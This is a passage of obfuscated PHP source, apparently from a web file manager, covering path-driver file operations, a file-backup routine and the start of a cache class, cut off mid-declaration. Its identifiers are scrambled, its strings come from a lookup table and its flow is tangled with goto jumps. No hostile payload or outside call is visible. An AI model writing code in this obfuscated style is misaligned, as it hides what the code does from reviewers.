$FˆË‚…éÇ–[$eŒÓÙëŒ‚Ç[1084]][$Aô§¼°Çø]; if ($Aô§¼°Çø == count($FˆË‚…éÇ–[$eŒÓÙëŒ‚Ç[1084]]) - 1) { $AÑÕ­ŒÎõ÷ = $this->model->mkfile($AÑÕ­ŒÎõ÷, $d˜ÒÔ¿à, $AšÓ…‘¸ˆ“, $c”©–¹íÛ); break; } $AÑÕ­ŒÎõ÷ = $this->model->mkdir($AÑÕ­ŒÎõ÷, $d˜ÒÔ¿à, REPEAT_SKIP); } return $this->getPathOuter($AÑÕ­ŒÎõ÷); } public function mkdir($f÷œğÏáˆ¸, $a—†‡äÅ¹ = REPEAT_SKIP) { $AËéœî‹²¼ =& $_SERVER[ì‹É]; $B›É‡»Ù´‹ = $this->parse($f÷œğÏáˆ¸); $f÷œğÏáˆ¸ = $B›É‡»Ù´‹[$AËéœî‹²¼[364]]; for ($EÒÏÒà±†ì = 0; $EÒÏÒà±†ì < count($B›É‡»Ù´‹[$AËéœî‹²¼[1084]]); $EÒÏÒà±†ì++) { $açÈÆ¡ÕÄ = $B›É‡»Ù´‹[$AËéœî‹²¼[1084]][$EÒÏÒà±†ì]; $f÷œğÏáˆ¸ = $this->model->mkdir($f÷œğÏáˆ¸, $açÈÆ¡ÕÄ, $a—†‡äÅ¹); } return $this->getPathOuter($f÷œğÏáˆ¸); } public function copyFile($BÓÇæ˜Ó´, $cè˜ÊãÑ°ø, $C»‚¾ÊÕ = REPEAT_REPLACE) { $F§¡ˆ®à„­ =& $_SERVER[ì‹É]; $fõÆ”ù¢¿Ì = $this->parse($cè˜ÊãÑ°ø); $Eâ÷Ïğ×®Ò = $this->model->copy($BÓÇæ˜Ó´, $fõÆ”ù¢¿Ì[$F§¡ˆ®à„­[364]], $C»‚¾ÊÕ, $fõÆ”ù¢¿Ì[$F§¡ˆ®à„­[76]]); return $Eâ÷Ïğ×®Ò ? $this->getPathOuter($Eâ÷Ïğ×®Ò) : !1; } public function moveFile($BÔŒÛ”í§í, $d¿–µê»“ã, $CËÉïé®ˆÎ = REPEAT_REPLACE) { $bæ„šŸà¦ =& $_SERVER[ì‹É]; $CùÅ¨İÏˆµ = $this->parse($d¿–µê»“ã); $dŸª¦°¸õ„ = $this->model->move($BÔŒÛ”í§í, $CùÅ¨İÏˆµ[$bæ„šŸà¦[364]], $CËÉïé®ˆÎ, $CùÅ¨İÏˆµ[$bæ„šŸà¦[76]]); return $dŸª¦°¸õ„ ? $this->getPathOuter($dŸª¦°¸õ„) : !1; } public function copy($eíºšîÛæ, $FÆ¢Éªİ¬, $aÃƒ¡•³ˆ = REPEAT_REPLACE) { $BØÀ®ó°•Ş = $this->parse($FÆ¢Éªİ¬); $C×ÁÜö£Ç¨ = $this->model->copy($eíºšîÛæ, $BØÀ®ó°•Ş[$_SERVER[ì‹É][364]], $aÃƒ¡•³ˆ); return $C×ÁÜö£Ç¨ ? $this->getPathOuter($C×ÁÜö£Ç¨) : !1; } public function move($b…Á·ß¬ÒÜ, $E“®™™ƒáå, $b‹æèÛ–ê = REPEAT_REPLACE) { $FÓŸÌ²Úœ = $this->parse($E“®™™ƒáå); $EİÉ÷›î„› = $this->model->move($b…Á·ß¬ÒÜ, $FÓŸÌ²Úœ[$_SERVER[ì‹É][364]], $b‹æèÛ–ê); return $EİÉ÷›î„› ? $this->getPathOuter($EİÉ÷›î„›) : !1; } public function remove($D‡âä·«‹, $EèÎ™ïô­¼ = true) { return $this->model->remove($D‡âä·«‹, $EèÎ™ïô­¼); } public function rename($F”¹õ´‘œ, $a»—óÈº) { $e‚­ä–ºÉŠ = $this->model->rename($F”¹õ´‘œ, $a»—óÈº); return $e‚­ä–ºÉŠ ? $this->getPathOuter($F”¹õ´‘œ) : $e‚­ä–ºÉŠ; } public function size($F¢ğÒ£éš¼) { $DÈÅìÅØÇ½ = $this->infoSimple($F¢ğÒ£éš¼); return $DÈÅìÅØÇ½ ? $DÈÅìÅØÇ½[$_SERVER[ì‹É][78]] : 0; } public function infoSimple($FÂ¯ïĞ°ØÉ) { return $this->model->sourceInfo($FÂ¯ïĞ°ØÉ); } public function info($bë‰çÑñĞ·) { return $this->infoParse($bë‰çÑñĞ·); } public function infoAuth($A¥÷¿Î¨Š¥) { return $this->infoParse($A¥÷¿Î¨Š¥, !1, !0); } public function infoWithChildren($DŠ·ÊÆ¯ÉÚ) { return $this->infoParse($DŠ·ÊÆ¯ÉÚ, !0); } protected function infoParse($Dë´ÀÅ·†, $DÕŞÖç±«Š = false, $FùÓŠË½ä¸ = false) { if (!$DÕŞÖç±«Š) { return $this->model->pathInfo($Dë´ÀÅ·†, $FùÓŠË½ä¸); } return $this->model->pathInfoMore($Dë´ÀÅ·†); } public function infoFull($Aè‰×âª×) { $f§‡ƒáòù =& $_SERVER[ì‹É]; $E“ÆïÃˆÇ« = explode($f§‡ƒáòù[8], $Aè‰×âª×); $cÁÈçìÌî = implode($f§‡ƒáòù[8], array_splice($E“ÆïÃˆÇ«, 1)); return $this->model->pathInfoByPath($E“ÆïÃˆÇ«[0], $cÁÈçìÌî); } public function hashSimple($b¶äï­ÛÀ‹) { $f‡—‰ò” =& $_SERVER[ì‹É]; $fÃÁÚ‚È‰ = $this->infoWithChildren($b¶äï­ÛÀ‹); return $fÃÁÚ‚È‰[$f‡—‰ò”[159]][$f‡—‰ò”[161]]; } public function hashMd5($DŠ’ºÃÀ“ì) { $cİ‚ß‹îÃµ =& $_SERVER[ì‹É]; $f’ï¥Ï´ºø = $this->infoWithChildren($DŠ’ºÃÀ“ì); return $f’ï¥Ï´ºø[$cİ‚ß‹îÃµ[159]][$cİ‚ß‹îÃµ[160]]; } public function exist($cƒóš›©©¬) { $A²É—Øº =& $_SERVER[ì‹É]; $d´×ä´âÊ = $this->parse($cƒóš›©©¬); if (!$d´×ä´âÊ[$A²É—Øº[76]]) { return $this->isFile($cƒóš›©©¬) || $this->isFolder($cƒóš›©©¬); } $E¼ÙÃ¼ÄÇœ = array($A²É—Øº[365] => $d´×ä´âÊ[$A²É—Øº[364]], $A²É—Øº[28] => $d´×ä´âÊ[$A²É—Øº[76]]); $Aåöô²§— = $this->model->where($E¼ÙÃ¼ÄÇœ)->find(); return $Aåöô²§— ? !0 : !1; } public function isFile($Eá¥½šõƒ”) { $dìíœ±å‹ =& $_SERVER[ì‹É]; $Bä¢’˜ÙÑÀ = $this->infoSimple($Eá¥½šõƒ”); return $Bä¢’˜ÙÑÀ && $Bä¢’˜ÙÑÀ[$dìíœ±å‹[367]] == $dìíœ±å‹[84] ? !1 : !0; } public function isFolder($AÃÕÈëŒÑ‰) { $D´À’ğÑ©¶ =& $_SERVER[ì‹É]; $FÈ„²°° = $this->infoSimple($AÃÕÈëŒÑ‰); return $FÈ„²°° && $FÈ„²°°[$D´À’ğÑ©¶[367]] == $D´À’ğÑ©¶[84] ? !0 : !1; } public function listPath($c¾éÕğ¶ŸÃ, $BÌ¢ÂšËø° = false) { $BÜ Ğêé™õ =& $_SERVER[ì‹É]; if ($c¾éÕğ¶ŸÃ == $BÜ Ğêé™õ[33]) { return !1; } $Cé×„‚½ÜÌ = array($BÜ Ğêé™õ[365] => $c¾éÕğ¶ŸÃ); if ($BÌ¢ÂšËø°) { return $this->model->listSource($Cé×„‚½ÜÌ, -1); } return $this->model->listSource($Cé×„‚½ÜÌ); } public function has($aïÂÇòØªÏ, $Eä×Œèæ’¾ = false, $a¤¼ÁÁ¨Ô§ = null) { $eÌï×Í¾½ =& $_SERVER[ì‹É]; $bè¢šë¾õ = $this->infoWithChildren($aïÂÇòØªÏ); if ($Eä×Œèæ’¾) { return array($eÌï×Í¾½[189] => $bè¢šë¾õ[$eÌï×Í¾½[189]], $eÌï×Í¾½[188] => $bè¢šë¾õ[$eÌï×Í¾½[188]]); } return $a¤¼ÁÁ¨Ô§ ? $bè¢šë¾õ[$eÌï×Í¾½[189]] : $bè¢šë¾õ[$eÌï×Í¾½[188]]; } public function listAll($b©–åµñ«) { $B°½çõÜ™£ = IO::info($this->pathParse[$_SERVER[ì‹É][76]]); if (!$B°½çõÜ™£) { return array(); } return $this->model->listAll($b©–åµñ«); } public function getContent($C¢¦çŸ°ğ) { return $this->model->getContent($C¢¦çŸ°ğ); } public function setContent($fÓÌ­ëŸóí, $Cº¯†»›âƒ = '') { return $this->model->setContent($fÓÌ­ëŸóí, $Cº¯†»›âƒ); } public function fileSubstr($A½ÙÆèÖŒô, $aŠ„ÉÆÙêô, $E¦¹øÏñÇ) { return $this->model->fileSubstr($A½ÙÆèÖŒô, $aŠ„ÉÆÙêô, $E¦¹øÏñÇ); } public function download($eïÎ²Ÿ‚ô¤, $A×–µ•¥¥ = '') { $Bóî·ƒØ§ = get_path_father($A×–µ•¥¥); $AóÔÉ‡È‹’ = get_path_this($A×–µ•¥¥); $FÆ–×ğ›Øµ = $this->model->fileInfoGet($eïÎ²Ÿ‚ô¤); $dÔ’©ôƒì = IO::copy($FÆ–×ğ›Øµ[$_SERVER[ì‹É][76]], $Bóî·ƒØ§, !1, $AóÔÉ‡È‹’); return $dÔ’©ôƒì; } public function upload($cÙÜì­Ç„, $C¸‡çßÇÍõ, $eïäìÖ—‘ƒ = false, $E…¿Ñ¼¡‰Ã = REPEAT_REPLACE) { $Ağ‘­¹ÌÙ =& $_SERVER[ì‹É]; $e³ôÖªñ® = $this->parse($cÙÜì­Ç„); $d¦Á·Ãå‹’ = $this->model->addFile($e³ôÖªñ®[$Ağ‘­¹ÌÙ[364]], $C¸‡çßÇÍõ, $e³ôÖªñ®[$Ağ‘­¹ÌÙ[76]], $eïäìÖ—‘ƒ, $E…¿Ñ¼¡‰Ã); return $this->getPathOuter($d¦Á·Ãå‹’); } public function uploadFileByID($B‰íœŒÂ¼, $BÉ©îµ¹Ñè, $A¯„ÎÓîã) { $AŞ“³Œ¸“ =& $_SERVER[ì‹É]; $C‹š†‰¶‹¥ = $this->parse($B‰íœŒÂ¼); $eğ—†Ô¤ùµ = $this->model->addFileByFileID($C‹š†‰¶‹¥[$AŞ“³Œ¸“[364]], $BÉ©îµ¹Ñè, $C‹š†‰¶‹¥[$AŞ“³Œ¸“[76]], $A¯„ÎÓîã); return $this->getPathOuter($eğ—†Ô¤ùµ); } public function addFileByRemote($C½–š¤íÃ¢, $A¼º¤øˆĞ, $CÃ…Şì»â³ = array(), $AÅËÎŸã„× = '', $dšÚ»¸ãø°) { $e—æÒÕ› =& $_SERVER[ì‹É]; $E…âŞ©™—® = $this->parse($C½–š¤íÃ¢); $AÅËÎŸã„× = empty($AÅËÎŸã„×) ? $E…âŞ©™—®[$e—æÒÕ›[76]] : $AÅËÎŸã„×; $B©ÚÓš‹ = $this->model->addFileByRemote($E…âŞ©™—®[$e—æÒÕ›[364]], $A¼º¤øˆĞ, $AÅËÎŸã„×, $CÃ…Şì»â³, $dšÚ»¸ãø°); return $this->getPathOuter($B©ÚÓš‹); } public function uploadLink($C’â‰—åÀœ, $F°ëĞ†¾¾› = 0) { $d¢”°ÉÛ… =& $_SERVER[ì‹É]; $bÛî‡¡ŒãÂ = $this->parse($C’â‰—åÀœ); $C’â‰—åÀœ = Model($d¢”°ÉÛ…[536])->createFileName($bÛî‡¡ŒãÂ[$d¢”°ÉÛ…[76]]); $Bèê‘ß°ÉÚ = IO::uploadLink($C’â‰—åÀœ, $F°ëĞ†¾¾›); return $Bèê‘ß°ÉÚ; } public function fileNameAuto($fÆ†ˆ¹ëê°, $aÚÏˆ‘µ½, $aŸ™–…ƒÔí = REPEAT_REPLACE, $e°Ş¾îÚÕ¨ = false) { return $this->model->fileNameAuto($fÆ†ˆ¹ëê°, $aÚÏˆ‘µ½, $aŸ™–…ƒÔí, $e°Ş¾îÚÕ¨); } public function fileNameExist($dçŞÁœÖ•ï, $FŠ•…ñƒó) { return $this->model->fileNameExist($dçŞÁœÖ•ï, $FŠ•…ñƒó); } protected function _fileOut($EÆÌŒÓ‰®‘, $B†Ş†ÎµÄÊ = false, $fÔæŞïšƒ = false, $fî†••óº× = '', $DŒŠä×¯Š = false) { goto dæñáØŠ; dæñáØŠ: $Dò¯ÇÉ«ÎŠ =& $_SERVER[ì‹É]; $aÈÇ™öá… = $this->model->sourceInfo($EÆÌŒÓ‰®‘); if ($aÈÇ™öá…[$Dò¯ÇÉ«ÎŠ[367]] == $Dò¯ÇÉ«ÎŠ[84]) { header($Dò¯ÇÉ«ÎŠ[1085]); die; } goto C¾Îè‚„ª«; bÒ¦ŞŒ×‹‚: if ($DŒŠä×¯Š) { return IO::fileOutServer($D„Ûæ—£[$Dò¯ÇÉ«ÎŠ[76]], $B†Ş†ÎµÄÊ, $a–•êµƒø‡, $fî†••óº×); } IO::fileOut($D„Ûæ—£[$Dò¯ÇÉ«ÎŠ[76]], $B†Ş†ÎµÄÊ, $a–•êµƒø‡, $fî†••óº×); goto CÏƒô²Ì; C¾Îè‚„ª«: $D„Ûæ—£ = $this->model->fileInfoGet($EÆÌŒÓ‰®‘); $fî†••óº× = $D„Ûæ—£[$Dò¯ÇÉ«ÎŠ[160]] ? $D„Ûæ—£[$Dò¯ÇÉ«ÎŠ[160]] : $fî†••óº×; $a–•êµƒø‡ = isset($GLOBALS[$Dò¯ÇÉ«ÎŠ[1086]]) ? $GLOBALS[$Dò¯ÇÉ«ÎŠ[1086]] : $aÈÇ™öá…[$Dò¯ÇÉ«ÎŠ[28]]; goto bÒ¦ŞŒ×‹‚; CÏƒô²Ì: } public function fileOut($FØƒ·İî™Ò, $f‚éØ•—â• = false, $B½ö´„°ø‰ = false, $CÛÒÆ•ºè² = '') { $this->_fileOut($FØƒ·İî™Ò, $f‚éØ•—â•, $B½ö´„°ø‰, $CÛÒÆ•ºè²); } public function fileOutServer($FËó£ÉÛÍ, $dÂŸÑ¸»ì = false, $c®Ò°îµ‚ = false, $fÙšëÇ°éÇ = '') { $this->_fileOut($FËó£ÉÛÍ, $dÂŸÑ¸»ì, $c®Ò°îµ‚, $fÙšëÇ°éÇ, !0); } protected function _fileOutImage($f°¥ˆª™„Ã, $CÂ¡Ë…°Æ = 250) { $fÓ˜ËÕ ÂÉ =& $_SERVER[ì‹É]; $a„ùƒï¯® = $this->model->sourceInfo($f°¥ˆª™„Ã); if ($a„ùƒï¯®[$fÓ˜ËÕ ÂÉ[367]] == $fÓ˜ËÕ ÂÉ[84]) { show_json($fÓ˜ËÕ ÂÉ[1087] . $f°¥ˆª™„Ã, !1); } $GLOBALS[$fÓ˜ËÕ ÂÉ[1086]] = $a„ùƒï¯®[$fÓ˜ËÕ ÂÉ[28]]; $Aö¶‰‹ñ³ = $this->model->fileInfoGet($f°¥ˆª™„Ã); IO::fileOutImage($Aö¶‰‹ñ³[$fÓ˜ËÕ ÂÉ[76]], $CÂ¡Ë…°Æ); } public function fileOutImage($eóñ´ô ‹, $f·ôíº¸– = 250) { $this->_fileOutImage($eóñ´ô ‹, $f·ôíº¸–); } public function fileOutImageServer($AÆ‰‰¦»ì‹, $C†º­ôáÀ = 250) { $this->_fileOutImage($AÆ‰‰¦»ì‹, $C†º­ôáÀ); } public function link($c®Ê†…Ì÷Ş, $bÎ©è“Õ = '') { $E¼Ç»âµñ = $this->model->fileInfoGet($c®Ê†…Ì÷Ş); return IO::link($E¼Ç»âµñ[$_SERVER[ì‹É][76]], $bÎ©è“Õ); } protected function parse($f»ˆğ¢…¿•) { $Fß¹™†¼â =& $_SERVER[ì‹É]; if (strstr($f»ˆğ¢…¿•, $Fß¹™†¼â[8]) === !1) { return array($Fß¹™†¼â[382] => intval($f»ˆğ¢…¿•), $Fß¹™†¼â[76] => $Fß¹™†¼â[33], $Fß¹™†¼â[1084] => array()); } $b«’¿§ŠˆÍ = explode($Fß¹™†¼â[8], trim($f»ˆğ¢…¿•, $Fß¹™†¼â[8])); if (count($b«’¿§ŠˆÍ) < 2) { show_tips($f»ˆğ¢…¿• . $Fß¹™†¼â[1088]); } return array($Fß¹™†¼â[382] => intval($b«’¿§ŠˆÍ[0]), $Fß¹™†¼â[76] => $b«’¿§ŠˆÍ[1], $Fß¹™†¼â[1084] => array_slice($b«’¿§ŠˆÍ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($aÔ ‹ğêï¼) { $this->pathParse = $aÔ ‹ğêï¼; $this->model = Model($_SERVER[ì‹É][1083]); } public function getPathOuter($b¸Ì§Ó­¹Ù) { $E‡ÕğÛÌ¤ =& $_SERVER[ì‹É]; if (!$b¸Ì§Ó­¹Ù) { return $b¸Ì§Ó­¹Ù; } $c¦÷¶ó÷ = $this->parse($b¸Ì§Ó­¹Ù); return trim(KodIO::makeShare($this->pathParse[$E‡ÕğÛÌ¤[364]], $c¦÷¶ó÷[$E‡ÕğÛÌ¤[364]]), $E‡ÕğÛÌ¤[8]); } protected function infoParse($DÑæÌäïç¸, $CÓá»ŒëÏ = false, $f™•ÚŒÊ«Ò = false) { $F¶ğ†«ˆÚ® =& $_SERVER[ì‹É]; $cÉí¤ª”«è = $this->pathParse[$F¶ğ†«ˆÚ®[364]]; $EŸ¹Â‰»¬ = trim($this->pathParse[$F¶ğ†«ˆÚ®[984]], $F¶ğ†«ˆÚ®[8]); return Action($F¶ğ†«ˆÚ®[1089])->sharePathInfo($cÉí¤ª”«è, $EŸ¹Â‰»¬); } public function infoFull($fßÂ‚£ªÚ…) { $cİ¹â÷µÚ¡ =& $_SERVER[ì‹É]; $Aß‡·ºÂêÖ = explode($cİ¹â÷µÚ¡[8], trim($fßÂ‚£ªÚ…, $cİ¹â÷µÚ¡[8])); if (count($Aß‡·ºÂêÖ) > 1) { $Eß‘ù‡äê = implode($cİ¹â÷µÚ¡[8], array_splice($Aß‡·ºÂêÖ, 1)); $B¶×Äˆ»êÁ = $this->model->pathInfoByPath($Aß‡·ºÂêÖ[0], $Eß‘ù‡äê); if (!$B¶×Äˆ»êÁ) { return !1; } $this->pathParse[$cİ¹â÷µÚ¡[984]] = $B¶×Äˆ»êÁ[$cİ¹â÷µÚ¡[366]]; } return $this->infoParse($fßÂ‚£ªÚ…); } public function listAll($B¿öé‚ò) { goto bÛ»ëŒÄ¯; e¡ƒà÷ì™õ: foreach ($däĞõ°ÆØ÷ as &$cé½Š¯áñ) { check_abort(); $cé½Š¯áñ[$FÆåŞÌ‚…ä[388]] = $D±ÀòÎµ¼ƒ->_shareItemeParse($cé½Š¯áñ[$FÆåŞÌ‚…ä[388]], $F‘…áÍµåÛ); } return $däĞõ°ÆØ÷; goto fÓ¸¾ìÇ›À; bÛ»ëŒÄ¯: $FÆåŞÌ‚…ä =& $_SERVER[ì‹É]; $EØ”›‹ôÜ = IO::info($this->pathParse[$FÆåŞÌ‚…ä[76]]); if (!$EØ”›‹ôÜ) { return array(); } goto aïëˆõéÕ¬; aïëˆõéÕ¬: $däĞõ°ÆØ÷ = $this->model->listAll($B¿öé‚ò); $F‘…áÍµåÛ = Model($FÆåŞÌ‚…ä[528])->getInfo($EØ”›‹ôÜ[$FÆåŞÌ‚…ä[437]]); $D±ÀòÎµ¼ƒ = Action($FÆåŞÌ‚…ä[1089]); goto e¡ƒà÷ì™õ; fÓ¸¾ìÇ›À: } } goto Bğ²‘×Ñ†ë; C‘ŒéÊè”: class BackupFile { public function __construct() { } public function index() { goto b¿Àõîôç; C¾›¤¹õ¨: $CÜ«‡ã¸Ô‰->task[$_SERVER[ì‹É][685]] = $A”ó¨×½×ï; $BùòÛŠÙ© = array($_SERVER[ì‹É][744] => $e¶…¤ÒŒØ, $_SERVER[ì‹É][745] => $A”ó¨×½×ï); Backup::set($BùòÛŠÙ©); goto F‰Ãæ‰ëª; C³•¯‡éë: $e¶…¤ÒŒØ = (int) Model($_SERVER[ì‹É][709])->where($C´—ãóš‹¡)->count($_SERVER[ì‹É][415]); $A”ó¨×½×ï = (int) Model($_SERVER[ì‹É][709])->where($C´—ãóš‹¡)->sum($_SERVER[ì‹É][78]); $CÜ«‡ã¸Ô‰ = new TaskFileTransfer($_SERVER[ì‹É][742], $_SERVER[ì‹É][698], $e¶…¤ÒŒØ, LNG($_SERVER[ì‹É][699]) . $_SERVER[ì‹É][700] . LNG($_SERVER[ì‹É][743])); goto C¾›¤¹õ¨; b¿Àõîôç: $F´§‘Ù±„… = Backup::get(); $eï«Áéôøˆ = $F´§‘Ù±„…[$_SERVER[ì‹É][278]][$_SERVER[ì‹É][164]][$_SERVER[ì‹É][415]]; $C´—ãóš‹¡ = array($_SERVER[ì‹É][416] => array($_SERVER[ì‹É][740], $eï«Áéôøˆ), $_SERVER[ì‹É][741] => array($_SERVER[ì‹É][316], $F´§‘Ù±„…[$_SERVER[ì‹É][678]])); goto C³•¯‡éë; e‘ÒÁô¾²à: $EŞô«Äºè = 1000; $F™ğÎ¹ƒßâ = $dˆÖ»†„§÷ = 0; $cå º¼’á = array(); goto DôÛ¬ÕÈùè; bºæÍ·´ùñ: $cí°ø•³›Â = $cĞ¡á’Ñ¢´ ? 1 : 0; $BùòÛŠÙ© = array($_SERVER[ì‹É][755] => 1, $_SERVER[ì‹É][690] => time(), $_SERVER[ì‹É][696] => $cí°ø•³›Â, $_SERVER[ì‹É][752] => $eï«Áéôøˆ, $_SERVER[ì‹É][745] => $A”ó¨×½×ï, $_SERVER[ì‹É][744] => $e¶…¤ÒŒØ); if ($dˆÖ»†„§÷) { $BùòÛŠÙ©[$_SERVER[ì‹É][753]] = $eÌñì‡éÖ½; $BùòÛŠÙ©[$_SERVER[ì‹É][754]] = $Dá‰Š•Ë…â; } goto eÚªÎº; eÚªÎº: Backup::set($BùòÛŠÙ©); $this->_fileFilter($cå º¼’á); return !0; goto B¢†Šé¥Î; DôÛ¬ÕÈùè: $Dá‰Š•Ë…â = $eÌñì‡éÖ½ = 0; do { $dôä½×Õò = $_SERVER[ì‹É][746]; $C¶ŒªĞ¬Ğ = Model($_SERVER[ì‹É][709])->where($C´—ãóš‹¡)->field($dôä½×Õò)->order($_SERVER[ì‹É][747])->selectPage($EŞô«Äºè, $cö¨í§É¡«); $d‡†·±‰õ  = !empty($C¶ŒªĞ¬Ğ[$_SERVER[ì‹É][350]]) ? $C¶ŒªĞ¬Ğ[$_SERVER[ì‹É][350]] : array(); foreach ($d‡†·±‰õ  as $d“êŸîĞ°) { goto eÍ†Õ¯—ï‰; a˜›¸é †Ğ: $F™ğÎ¹ƒßâ += $d“êŸîĞ°[$_SERVER[ì‹É][78]]; $eÌñì‡éÖ½ += 1; $Dá‰Š•Ë…â += $d“êŸîĞ°[$_SERVER[ì‹É][78]]; goto bä·„¸šç¶; EÄè‚­ø¦µ: if (IO::exist($d†Úù„©Ô®)) { $CÜ«‡ã¸Ô‰->updateFileEnd($d“êŸîĞ°[$_SERVER[ì‹É][28]], $d“êŸîĞ°[$_SERVER[ì‹É][78]]); } else { $d†Úù„©Ô® = get_path_father($d†Úù„©Ô®); IO::mkdir($d†Úù„©Ô®); if (!IO::copy($D°˜Óå¯éè, $d†Úù„©Ô®, $_SERVER[ì‹É][749])) { write_log($_SERVER[ì‹É][750] . $D°˜Óå¯éè . $_SERVER[ì‹É][751] . $d†Úù„©Ô® . $_SERVER[ì‹É][468], $_SERVER[ì‹É][698]); $cĞ¡á’Ñ¢´ = !1; break; } } $eï«Áéôøˆ = $d“êŸîĞ°[$_SERVER[ì‹É][415]]; $dˆÖ»†„§÷ += 1; goto a˜›¸é †Ğ; bä·„¸šç¶: if ($F™ğÎ¹ƒßâ >= 1024 * 1024 * 50) { $BùòÛŠÙ© = array($_SERVER[ì‹É][752] => $eï«Áéôøˆ, $_SERVER[ì‹É][753] => $eÌñì‡éÖ½, $_SERVER[ì‹É][754] => $Dá‰Š•Ë…â); Backup::set($BùòÛŠÙ©); $F™ğÎ¹ƒßâ = $dˆÖ»†„§÷ = 0; } goto EëÌöÂèÚ»; eÍ†Õ¯—ï‰: if (!$this->_fileExist($d“êŸîĞ°, $cå º¼’á, $AèğäÒ÷Í…)) { $e¶…¤ÒŒØ -= 1; $A”ó¨×½×ï -= (int) $d“êŸîĞ°[$_SERVER[ì‹É][78]]; write_log("\146\151\154\145\40\156\157\164\40\145\170\x69\163\x74\x2e\x66\151\154\145\111\104\x3a{$d“êŸîĞ°[$_SERVER[ì‹É][415]]}\54\x20\160\x61\x74\150\72{$d“êŸîĞ°[$_SERVER[ì‹É][76]]}", $_SERVER[ì‹É][748]); continue; } $D°˜Óå¯éè = $d“êŸîĞ°[$_SERVER[ì‹É][76]]; $d†Úù„©Ô® = "\173\151\157\72{$F´§‘Ù±„…[$_SERVER[ì‹É][678]]}\x7d" . substr($D°˜Óå¯éè, strlen("\173\151\157\x3a{$d“êŸîĞ°[$_SERVER[ì‹É][710]]}\175")); goto EÄè‚­ø¦µ; EëÌöÂèÚ»: } $f…˜Ëì¥´¶ = count($d‡†·±‰õ ); $cö¨í§É¡«++; } while ($f…˜Ëì¥´¶ == $EŞô«Äºè); $CÜ«‡ã¸Ô‰->end(); goto bºæÍ·´ùñ; F‰Ãæ‰ëª: $cĞ¡á’Ñ¢´ = !0; $AèğäÒ÷Í… = $this->storeIds(); $cö¨í§É¡« = 1; goto e‘ÒÁô¾²à; B¢†Šé¥Î: } private function _fileExist($e…ç±«³Ñå, &$EÄœ˜Ğ¶á¦, $d­ğŒ¢àå) { goto F÷” ‹ğ‹Ò; B¼ÃÄå´å•: if (IO::exist($B²´Ñ‚Ùê¢)) { $EÄœ˜Ğ¶á¦[] = $e…ç±«³Ñå[$cÉ£‡…Õí[415]]; return !1; } $Fàø©õ¾… = array($cÉ£‡…Õí[710] => $e…ç±«³Ñå[$cÉ£‡…Õí[710]], $cÉ£‡…Õí[76] => array($cÉ£‡…Õí[756], "{$B²´Ñ‚Ùê¢}\45")); $AğÅ¡‰î = Model($cÉ£‡…Õí[709])->where($Fàø©õ¾…)->field($cÉ£‡…Õí[416])->select(); goto eöİš“×Æ; e×îóƒÍ‰‰: if (!in_array($e…ç±«³Ñå[$cÉ£‡…Õí[710]], $d­ğŒ¢àå)) { return !1; } if (IO::exist($dâÚïô³ç)) { return !0; } $B²´Ñ‚Ùê¢ = get_path_father($dâÚïô³ç); goto B¼ÃÄå´å•; F÷” ‹ğ‹Ò: $cÉ£‡…Õí =& $_SERVER[ì‹É]; $dâÚïô³ç = $e…ç±«³Ñå[$cÉ£‡…Õí[76]]; if (in_array($e…ç±«³Ñå[$cÉ£‡…Õí[415]], $EÄœ˜Ğ¶á¦)) { return !1; } goto e×îóƒÍ‰‰; eöİš“×Æ: $EÄœ˜Ğ¶á¦ = array_merge($EÄœ˜Ğ¶á¦, array_to_keyvalue($AğÅ¡‰î, $cÉ£‡…Õí[33], $cÉ£‡…Õí[415])); return !1; goto BŞßŠáïŒ; BŞßŠáïŒ: } private function _fileFilter($CªÖ›ôÓ¥) { $D¤‚ =& $_SERVER[ì‹É]; if (empty($CªÖ›ôÓ¥)) { return; } $bˆÖí„Ù = array($D¤‚[415] => array($D¤‚[7], array_unique($CªÖ›ôÓ¥))); $E‡Õà÷®õÅ = Model($D¤‚[757])->where($bˆÖí„Ù)->field($D¤‚[366])->select(); foreach ($E‡Õà÷®õÅ as $a¡Ê°Ê ) { Model($D¤‚[757])->remove($a¡Ê°Ê [$D¤‚[366]], !1); } } private function storeIds() { $Cõóº¹‘¤› =& $_SERVER[ì‹É]; $EÚ¶Ø»©ÃÉ = Model($Cõóº¹‘¤›[691])->listData(); return array_to_keyvalue($EÚ¶Ø»©ÃÉ, $Cõóº¹‘¤›[33], $Cõóº¹‘¤›[364]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto a§ÅÒŞÆ; a§ÅÒŞÆ: $AÆ¥Ï¦èùİ =& $_SERVER[ì‹É]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Cô“Ì³½à; eÑø¿Šï¸: switch ($FãÈ¾²¯ËØ[$AÆ¥Ï¦èùİ[758]]) { case $AÆ¥Ï¦èùİ[17]: self::$handle = Model($AÆ¥Ï¦èùİ[760]); break; case $AÆ¥Ï¦èùİ[761]: self::$handle = new CacheRedis($dâØË‰¹ÀÎ, $b£¼ùÆÏ); break; case $AÆ¥Ï¦èùİ[762]: self::$handle = new CacheMemcached($dâØË‰¹ÀÎ, $b£¼ùÆÏ); break; case $AÆ¥Ï¦èùİ[164]: self::$handle = new CacheFile($dâØË‰¹ÀÎ, $b£¼ùÆÏ); break; default: break; } return self::$handle; goto b¤×­Íğô; Cô“Ì³½à: $FãÈ¾²¯ËØ = $GLOBALS[$AÆ¥Ï¦èùİ[6]][$AÆ¥Ï¦èùİ[334]]; $dâØË‰¹ÀÎ = $FãÈ¾²¯ËØ[$FãÈ¾²¯ËØ[$AÆ¥Ï¦èùİ[758]]]; $b£¼ùÆÏ = $FãÈ¾²¯ËØ[$AÆ¥Ï¦èùİ[759]]; goto eÑø¿Šï¸; b¤×­Íğô: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($cñ†¶Öîô) { if (is_array($cñ†¶Öîô) || is_object($cñ†¶Öîô)) { $cñ†¶Öîô = json_encode($cñ†¶Öîô); } $cñ†¶Öîô = rawurlencode($cñ†¶Öîô); return KOD_SITE_ID . $_SERVER[ì‹É][71] . $cñ†¶Öîô; } public static function get($dˆÁ§ùÈ‰Ü) { $a¢çºİÅà” = self::key($dˆÁ§ùÈ‰Ü); if (!isset(self::$memoryCache[$a¢çºİÅà”])) { CacheLock::lock($dˆÁ§ùÈ‰Ü); $bµã‰¹Å¦Å = self::init()->get($a¢çºİÅà”); CacheLock::unlock($dˆÁ§ùÈ‰Ü); self::$memoryCache[$a¢çºİÅà”] = unserialize($bµã‰¹Å¦Å); } return self::$memoryCache[$a¢çºİÅà”]; } public static function set($B÷œËÍ¡óô, $C»’ÊêÔé°, 